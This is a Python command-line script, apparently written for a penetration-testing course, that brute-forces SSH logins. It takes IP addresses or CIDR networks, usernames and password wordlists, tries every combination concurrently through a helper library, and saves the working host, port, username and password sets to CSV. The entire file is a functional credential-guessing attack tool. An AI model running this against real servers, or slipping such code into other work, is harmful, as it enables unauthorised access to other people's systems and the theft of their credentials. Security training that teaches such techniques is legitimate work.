#! /usr/bin/env python3

import os
import paramiko
import sys
import thm_pythonforpentesters_lib as lib

if __name__ == '__main__':
    import argparse
    import concurrent.futures
    import csv
    parser = argparse.ArgumentParser()
    parser.add_argument('iplist', nargs='?', help='Comma-separated'
                        ' list of IP addresses to scan. It is possible'
                        ' to provide networks in CIDR notation.'
                        ' Networks and IP addresses can be mixed.')
    parser.add_argument('--ipfile', '-i', type=argparse.FileType('r'),
                        help='File with IP addresses or networks to'
                        'scan. One address/network per line. These'
                        ' will be merged with any IP addresses/networks'
                        ' provided on the commandline')
    parser.add_argument('--port', '-p', type=int, default=22,
                        help='The port the SSH server is running on'
                        ' Default: 22')
    parser.add_argument('--usernames', '-u', help='The usernames to'
                        ' try. This can be either a single name or'
                        ' a comma-separated list.')
    parser.add_argument('--userfile', '-U', type=argparse.FileType('r'),
                        help='A file containing usernames to try.'
                        ' One line per username.')
    parser.add_argument('--passwords',  help='The password(s)'
                        ' to try. This can be a single password or a'
                        ' comma-separated list. Note, however, that'
                        ' passwords which contain commas are not'
                        ' supported by this method. Use --wordlist | -w'
                        ' instead.')
    parser.add_argument('--wordlist', '-P', type=argparse.FileType('r'),
                        help='A file containing the passwords to try.'
                        ' One password per line.')
    parser.add_argument('--outfile', '-o', default='-', 
                        help='File to write results to.'
                        ' Format: "Host","Port","Username","Password"'
                        ' Default: STDOUT.')
    parser.add_argument('--threads', type=int, default=5,
                        help='Number of concurrent threads to run.'
                        ' Default: 5')
    parser.add_argument('--verbose', '-v', action='store_true', 
                        help='Print verbose output to STDERR.')
    args = parser.parse_args()
    usernames = set()
    passwords = set()
    hosts = set()
    port = args.port
    if args.iplist:
        hosts.update(lib.parse_ip_str(args.iplist))
    if args.ipfile:
        hosts.update(lib.parse_ip_file(args.ipfile))
    if len(hosts) == 0:
        print('No hosts provided. Exiting.', file=sys.stderr)
        sys.exit(1)
    if args.verbose:
        print('Trying the following hosts:', file=sys.stderr)
        for host in hosts:
            print(f'{host}', file=sys.stderr)
    if args.usernames:
        usernames.update(lib.parse_comma_separated_list(args.usernames))
    if args.userfile:
        usernames.update(lib.parse_file(args.userfile))
    if args.verbose:
        print('Trying the following usernames:', file=sys.stderr)
        for username in usernames:
            print(f'{username}', file=sys.stderr)
    if args.passwords:
        passwords.update(lib.parse_comma_separated_list(args.passwords))
    if args.wordlist:
        passwords.update(lib.parse_file(args.wordlist))
    if args.verbose:
        print('Trying the following passwords:', file=sys.stderr)
        for password in passwords:
            print(f'{password}', file=sys.stderr)
    if len(usernames) == 0:
        print('No usernames provided. Exiting.', file=sys.stderr)
        sys.exit(1)
    if len(passwords) == 0:
        print('No passwords provided. Exiting.', file=sys.stderr)
        sys.exit(1)
    valid_creds = []
    argument_tuples = list()
    for host in hosts:
        for username in usernames:
            for password in passwords:
                argument_tuples.append((username, password, host, port))
    if args.verbose:
        print(f'Trying {len(argument_tuples)} combinations with',
              f'{args.threads} workers.', file=sys.stderr)
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_creds = {executor.submit(lib.are_ssh_credentials_valid, arg[0], arg[1], arg[2], arg[3]): arg for arg in argument_tuples}
        for future in concurrent.futures.as_completed(future_creds):
            username, password, host, port = future_creds[future]
            if future.result() == True:
                valid_creds.append([host, port, username, password])
        
    if args.outfile == '-':
        for entry in valid_creds:
            print(f'"{entry[0]}","{entry[1]}","{entry[2]}","{entry[3]}"')
    else:
        with open(args.outfile,'w') as fd:
            writer = csv.writer(fd, dialect='unix', quoting=csv.QUOTE_ALL)
            header = ['Host','Port','Username','Password']
            writer.writerow(header)
            writer.writerows(valid_creds)
